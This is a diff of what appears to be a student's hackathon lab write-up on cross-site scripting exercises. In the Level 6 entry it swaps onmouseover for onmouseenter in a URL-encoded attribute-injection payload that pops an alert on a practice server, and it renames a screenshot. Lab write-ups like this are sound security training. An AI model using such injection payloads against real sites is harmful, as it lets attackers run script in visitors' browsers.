@@ -117,12 +117,12 @@ http://waph-hackathon.eastus.cloudapp.azure.com/xss/level5/echo.php?input=%3Cimg
 +  Level 6:
 
 ```
-http://waph-hackathon.eastus.cloudapp.azure.com/xss/level6/echo.php/%22%20onmouseover=%22alert('level%206:%20Hacked%20by%20Amit%20Gaddi%20%20')%22
+http://waph-hackathon.eastus.cloudapp.azure.com/xss/level6/echo.php/%22%20onmouseenter=%22alert('level%206:%20Hacked%20by%20Amit%20Gaddi%20%20')%22
 
 ```
 
 
-![Screenshot](images/Screenshot6.png)   
+![Screenshot](images/Screenshot61.png)   
 
 
 
